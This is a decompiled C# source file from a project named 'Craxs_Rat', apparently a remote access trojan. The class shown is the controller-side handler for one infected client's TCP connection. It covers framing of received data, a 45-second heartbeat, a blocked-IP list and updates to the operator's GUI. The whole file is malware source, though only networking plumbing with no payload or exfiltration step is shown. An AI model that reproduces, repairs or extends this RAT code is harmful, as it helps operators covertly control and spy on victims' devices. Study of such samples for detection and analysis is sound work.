using System;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace Craxs_Rat
{
	// Token: 0x020000FF RID: 255
	public class GClass8
	{
		// Token: 0x060012B7 RID: 4791 RVA: 0x000C1588 File Offset: 0x000BF788
		public GClass8(TcpClient tcpClient_0, int int_4, GClass7 gclass7_0)
		{
			this.string_3 = "";
			this.bool_0 = false;
			this.bool_1 = false;
			this.string_6 = "null";
			this.string_7 = "null";
			this.string_8 = "null";
			this.string_9 = "null";
			this.string_10 = "null";
			this.object_1 = "null";
			this.string_11 = "null";
			this.string_12 = "null";
			this.bool_6 = false;
			this.int_1 = 0;
			this.bool_7 = false;
			this.objects_1 = new object[3];
			this.bool_8 = false;
			this.bool_9 = false;
			this.int_2 = 0;
			this.string_13 = "n/a";
			this.bool_10 = false;
			this.bool_11 = false;
			this.bool_12 = false;
			this.objectValue = RuntimeHelpers.GetObjectValue(new object());
			this.method_0(tcpClient_0, int_4, gclass7_0);
		}

		// Token: 0x060012B8 RID: 4792 RVA: 0x000C167C File Offset: 0x000BF87C
		public void method_0(TcpClient tcpClient_0, int int_4, GClass7 gclass7_0)
		{
			try
			{
				this.gclass7_0 = gclass7_0;
				this.tcpClient_0 = tcpClient_0;
				this.tcpClient_0.Client.ReceiveTimeout = -1;
				this.tcpClient_0.Client.SendTimeout = -1;
				this.tcpClient_0.Client.SendBufferSize = 99999;
				this.tcpClient_0.Client.ReceiveBufferSize = 99999;
				this.string_2 = ((IPEndPoint)tcpClient_0.Client.RemoteEndPoint).ToString();
				this.string_1 = ((IPEndPoint)tcpClient_0.Client.RemoteEndPoint).Address.ToString();
				this.object_0 = string.Format("{0}:{1}", this.string_1, Conversions.ToString(int_4));
				this.bool_0 = true;
				this.int_3 = 60;
				this.bool_10 = false;
				this.objects_1[0] = null;
				this.string_4 = "3";
				this.object_5 = null;
				this.objects_1[1] = null;
				this.long_0 = -1L;
				this.int_0 = -1;
				this.dataGridViewRow_0 = null;
				this.bool_4 = true;
				this.bool_3 = false;
				this.bool_2 = false;
				this.bool_5 = false;
				this.string_0 = "0.0.0.0:0:null:null:null:null:0.0.0.0:0000:0";
				this.memoryStream_0 = new MemoryStream();
				this.bytes_0 = new byte[1];
				this.objects_0 = new object[]
				{
					-1,
					-1
				};
				this.object_2 = RuntimeHelpers.GetObjectValue(new object());
				this.dateTime_0 = DateTime.Now.AddSeconds(45.0);
				this.timer_0 = new System.Threading.Timer(new TimerCallback(this.method_1), null, 45000, 45000);
				try
				{
					if (!this.gclass7_0.strings_0.Contains(this.string_1))
					{
						this.tcpClient_0.Client.BeginReceive(this.bytes_0, 0, this.bytes_0.Length, SocketFlags.None, new AsyncCallback(this.method_5), this.tcpClient_0.Client);
					}
				}
				catch (Exception ex)
				{
				}
			}
			catch (Exception ex2)
			{
			}
		}

		// Token: 0x060012B9 RID: 4793 RVA: 0x000C18E4 File Offset: 0x000BFAE4
		private void method_1(object object_33)
		{
			try
			{
				if (this.bool_0)
				{
					if (this.gclass7_0.strings_0.Contains(this.string_1))
					{
						GClass9.smethod_2(null, this.string_1, this.image_0);
						this.method_6(this.tcpClient_0);
					}
					else if (DateTime.Compare(this.dateTime_0, DateTime.Now) < 0)
					{
						this.string_11 = "Check..";
						this.dateTime_0 = DateTime.Now.AddSeconds(45.0);
						if (this.bool_0)
						{
							if (this.int_2 >= 1)
							{
								this.int_2 = -5;
								object[] array = new object[]
								{
									this.tcpClient_0,
									Module13.string_38 + GClass9.string_0 + "null",
									Module2.smethod_9().GetBytes("null"),
									this
								};
								this.method_2(array);
							}
							else if (this.int_2 == -2)
							{
								this.method_6(this.tcpClient_0);
							}
						}
						else
						{
							this.method_6(this.tcpClient_0);
						}
					}
				}
				else
				{
					this.method_6(this.tcpClient_0);
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x060012BA RID: 4794 RVA: 0x000C1A4C File Offset: 0x000BFC4C
		public void method_2(object[] objects_0)
		{
			if (this.bool_0)
			{
				try
				{
					GClass8.Class28 @class = new GClass8.Class28();
					@class.gclass8_0 = this;
					@class.bytes_0 = Module2.smethod_51((string)objects_0[1], (byte[])objects_0[2]);
					ThreadPool.QueueUserWorkItem(new WaitCallback(@class.method_0), @class.bytes_0);
				}
				catch (Exception ex)
				{
				}
			}
		}

		// Token: 0x060012BB RID: 4795 RVA: 0x000C1AC4 File Offset: 0x000BFCC4
		public void method_3(byte[] bytes_0)
		{
			try
			{
				if (this.bool_0)
				{
					object obj = RuntimeHelpers.GetObjectValue(this.object_2);
					object obj2 = obj;
					ObjectFlowControl.CheckForSyncLockOnValueType(obj2);
					lock (obj2)
					{
						if (this.bool_0)
						{
							this.tcpClient_0.Client.Poll(-1, SelectMode.SelectWrite);
							this.tcpClient_0.Client.SendBufferSize = bytes_0.Length;
							this.tcpClient_0.Client.Send(bytes_0, 0, bytes_0.Length, SocketFlags.None);
							GClass7 gclass = this.gclass7_0;
							ref long ptr = ref gclass.long_0;
							gclass.long_0 = checked(ptr + unchecked((long)bytes_0.Length));
						}
					}
				}
			}
			catch (SocketException ex)
			{
				this.bool_0 = false;
			}
			catch (ObjectDisposedException ex2)
			{
				this.bool_0 = false;
			}
			catch (Exception ex3)
			{
				this.bool_0 = false;
			}
		}

		// Token: 0x060012BC RID: 4796 RVA: 0x000C1BE8 File Offset: 0x000BFDE8
		public void method_4(string string_0)
		{
			if (!this.gclass7_0.strings_0.Contains(string_0))
			{
				this.gclass7_0.strings_0.Add(string_0);
				GClass9.cypherRat_0.DGVblocked.Rows.Add(new object[]
				{
					this.image_0,
					string_0
				});
			}
		}

		// Token: 0x060012BD RID: 4797 RVA: 0x000C1C44 File Offset: 0x000BFE44
		public void method_5(IAsyncResult iasyncResult_0)
		{
			int num;
			try
			{
				num = this.tcpClient_0.Client.EndReceive(iasyncResult_0);
			}
			catch (SocketException ex)
			{
				num = -1;
			}
			catch (Exception ex2)
			{
				num = -1;
			}
			checked
			{
				if (num > 0)
				{
					try
					{
						this.gclass7_0.long_1 = this.gclass7_0.long_1 + unchecked((long)num);
						if (this.long_0 != -1L)
						{
							this.memoryStream_0.Write(this.bytes_0, 0, num);
							if (unchecked((long)this.memoryStream_0.ToArray().Length) == this.long_0)
							{
								GClass10 gclass = new GClass10(this, this.memoryStream_0.ToArray(), this.objects_0, this.tcpClient_0);
								object obj = RuntimeHelpers.GetObjectValue(this.gclass7_0.gclass10s_1);
								object obj2 = obj;
								ObjectFlowControl.CheckForSyncLockOnValueType(obj2);
								lock (obj2)
								{
									this.gclass7_0.gclass10s_0.Add(gclass);
								}
								do
								{
									Thread.Sleep(1);
									Application.DoEvents();
								}
								while (!gclass.bool_0);
								this.memoryStream_0.Dispose();
								this.memoryStream_0 = new MemoryStream();
								this.objects_0 = new object[]
								{
									-1,
									-1
								};
								this.long_0 = -1L;
								this.bytes_0 = new byte[1];
							}
							else
							{
								this.bytes_0 = new byte[(int)(this.long_0 - this.memoryStream_0.Length - 1L) + 1 - 1 + 1 - 1 + 1];
							}
						}
						else if (this.bytes_0[0] != 0)
						{
							this.memoryStream_0.WriteByte(this.bytes_0[0]);
						}
						else
						{
							this.memoryStream_0.WriteByte(this.bytes_0[0]);
							ref int ptr = ref this.int_0;
							this.int_0 = ptr + 1;
							if (this.int_0 == 1)
							{
								string text = Module2.smethod_9().GetString(this.memoryStream_0.ToArray()).Trim();
								string[] array = text.Split(new char[1], StringSplitOptions.None);
								long num2 = Versioned.IsNumeric(array[0].Trim()) ? Conversions.ToLong(array[0].Trim()) : 0L;
								long num3 = Versioned.IsNumeric(array[1].Trim()) ? Conversions.ToLong(array[1].Trim()) : 0L;
								this.objects_0 = new object[]
								{
									num2,
									num3
								};
								this.long_0 = num2 + num3;
								long num4 = this.long_0;
								this.tcpClient_0.Client.ReceiveBufferSize = (int)num4;
								this.int_0 = -1;
								this.bytes_0 = new byte[(int)(this.long_0 - 1L) + 1 - 1 + 1];
								this.memoryStream_0.Dispose();
								this.memoryStream_0 = new MemoryStream();
							}
						}
					}
					catch (Exception ex3)
					{
					}
					try
					{
						if (this.tcpClient_0.Client.Connected)
						{
							this.tcpClient_0.Client.BeginReceive(this.bytes_0, 0, this.bytes_0.Length, SocketFlags.None, new AsyncCallback(this.method_5), this.tcpClient_0.Client);
						}
						else
						{
							this.bool_0 = false;
						}
						return;
					}
					catch (SocketException ex4)
					{
						this.bool_0 = false;
						return;
					}
					catch (Exception ex5)
					{
						this.bool_0 = false;
						return;
					}
				}
				this.bool_0 = false;
			}
		}

		// Token: 0x060012BE RID: 4798 RVA: 0x000C2080 File Offset: 0x000C0280
		public Task method_6(TcpClient tcpClient_0)
		{
			GClass8.Class29 @class = new GClass8.Class29();
			@class.gclass8_0 = this;
			@class.tcpClient_0 = tcpClient_0;
			try
			{
				if (!this.bool_7)
				{
					this.bool_7 = true;
					this.bool_0 = false;
					try
					{
						this.timer_0.Dispose();
					}
					catch (Exception ex)
					{
					}
					Task.Run(new Action(@class.method_0));
				}
			}
			catch (Exception ex2)
			{
			}
			Task result;
			return result;
		}

		// Token: 0x060012BF RID: 4799 RVA: 0x000C2118 File Offset: 0x000C0318
		public void method_7(TcpClient tcpClient_0)
		{
			GClass8.Class30 @class = new GClass8.Class30();
			@class.gclass8_0 = this;
			@class.tcpClient_0 = tcpClient_0;
			@class.int_0 = -1;
			@class.asyncVoidMethodBuilder_0 = AsyncVoidMethodBuilder.Create();
			@class.asyncVoidMethodBuilder_0.Start<GClass8.Class30>(ref @class);
		}

		// Token: 0x060012C0 RID: 4800 RVA: 0x000C2158 File Offset: 0x000C0358
		public int method_8()
		{
			int num = 0;
			int result;
			if (this.long_0 == -1L)
			{
				result = num;
			}
			else
			{
				try
				{
					num = checked(this.method_9((int)this.memoryStream_0.Length, (int)this.long_0));
					result = num;
				}
				catch (ObjectDisposedException ex)
				{
					result = 0;
				}
			}
			return result;
		}

		// Token: 0x060012C1 RID: 4801 RVA: 0x000C21C4 File Offset: 0x000C03C4
		public int method_9(int int_4, int int_5)
		{
			int result;
			try
			{
				if (int_5 != 0)
				{
					result = checked((int)Math.Round(unchecked((double)int_4 / (double)int_5 * 100.0)));
				}
				else
				{
					result = 0;
				}
			}
			catch (Exception ex)
			{
				result = 0;
			}
			return result;
		}

		// Token: 0x04000A6B RID: 2667
		public string string_0;

		// Token: 0x04000A6C RID: 2668
		public string string_1;

		// Token: 0x04000A6D RID: 2669
		public string string_2;

		// Token: 0x04000A6E RID: 2670
		public string string_3;

		// Token: 0x04000A6F RID: 2671
		public string object_0;

		// Token: 0x04000A70 RID: 2672
		public byte[] bytes_0;

		// Token: 0x04000A71 RID: 2673
		public MemoryStream memoryStream_0;

		// Token: 0x04000A72 RID: 2674
		public long long_0;

		// Token: 0x04000A73 RID: 2675
		public bool bool_0;

		// Token: 0x04000A74 RID: 2676
		public int int_0;

		// Token: 0x04000A75 RID: 2677
		public Size size_0;

		// Token: 0x04000A76 RID: 2678
		public object[] objects_0;

		// Token: 0x04000A77 RID: 2679
		public DataGridViewRow dataGridViewRow_0;

		// Token: 0x04000A78 RID: 2680
		public bool bool_1;

		// Token: 0x04000A79 RID: 2681
		public bool bool_2;

		// Token: 0x04000A7A RID: 2682
		public bool bool_3;

		// Token: 0x04000A7B RID: 2683
		public bool bool_4;

		// Token: 0x04000A7C RID: 2684
		public bool bool_5;

		// Token: 0x04000A7D RID: 2685
		public Image image_0;

		// Token: 0x04000A7E RID: 2686
		public string string_4;

		// Token: 0x04000A7F RID: 2687
		public string string_5;

		// Token: 0x04000A80 RID: 2688
		public string string_6;

		// Token: 0x04000A81 RID: 2689
		public string string_7;

		// Token: 0x04000A82 RID: 2690
		public string string_8;

		// Token: 0x04000A83 RID: 2691
		public string string_9;

		// Token: 0x04000A84 RID: 2692
		public string string_10;

		// Token: 0x04000A85 RID: 2693
		public string object_1;

		// Token: 0x04000A86 RID: 2694
		public string string_11;

		// Token: 0x04000A87 RID: 2695
		public string string_12;

		// Token: 0x04000A88 RID: 2696
		public string[] strings_0;

		// Token: 0x04000A89 RID: 2697
		public bool bool_6;

		// Token: 0x04000A8A RID: 2698
		public int int_1;

		// Token: 0x04000A8B RID: 2699
		private object object_2;

		// Token: 0x04000A8C RID: 2700
		public bool bool_7;

		// Token: 0x04000A8D RID: 2701
		public object[] objects_1;

		// Token: 0x04000A8E RID: 2702
		public bool bool_8;

		// Token: 0x04000A8F RID: 2703
		public bool bool_9;

		// Token: 0x04000A90 RID: 2704
		public int int_2;

		// Token: 0x04000A91 RID: 2705
		public string string_13;

		// Token: 0x04000A92 RID: 2706
		public GClass7 gclass7_0;

		// Token: 0x04000A93 RID: 2707
		public TcpClient tcpClient_0;

		// Token: 0x04000A94 RID: 2708
		public int int_3;

		// Token: 0x04000A95 RID: 2709
		public object object_3;

		// Token: 0x04000A96 RID: 2710
		public object object_4;

		// Token: 0x04000A97 RID: 2711
		public string[] strings_1;

		// Token: 0x04000A98 RID: 2712
		public bool bool_10;

		// Token: 0x04000A99 RID: 2713
		public bool bool_11;

		// Token: 0x04000A9A RID: 2714
		public bool bool_12;

		// Token: 0x04000A9B RID: 2715
		public bool bool_13;

		// Token: 0x04000A9C RID: 2716
		public Bitmap object_5;

		// Token: 0x04000A9D RID: 2717
		private DateTime dateTime_0;

		// Token: 0x04000A9E RID: 2718
		public System.Threading.Timer timer_0;

		// Token: 0x04000A9F RID: 2719
		private readonly object objectValue;

		// Token: 0x02000100 RID: 256
		[CompilerGenerated]
		internal sealed class Class28
		{
			// Token: 0x060012C3 RID: 4803 RVA: 0x0000751C File Offset: 0x0000571C
			internal void method_0(object _object_0)
			{
				this.method_1();
			}

			// Token: 0x060012C4 RID: 4804 RVA: 0x000C2218 File Offset: 0x000C0418
			internal void method_1()
			{
				this.gclass8_0.method_3(this.bytes_0);
			}

			// Token: 0x04000AA0 RID: 2720
			public byte[] bytes_0;

			// Token: 0x04000AA1 RID: 2721
			public GClass8 gclass8_0;
		}

		// Token: 0x02000101 RID: 257
		[CompilerGenerated]
		internal sealed class Class29
		{
			// Token: 0x060012C6 RID: 4806 RVA: 0x000C2238 File Offset: 0x000C0438
			internal void method_0()
			{
				this.gclass8_0.method_7(this.tcpClient_0);
			}

			// Token: 0x04000AA2 RID: 2722
			public TcpClient tcpClient_0;

			// Token: 0x04000AA3 RID: 2723
			public GClass8 gclass8_0;
		}
	}
}
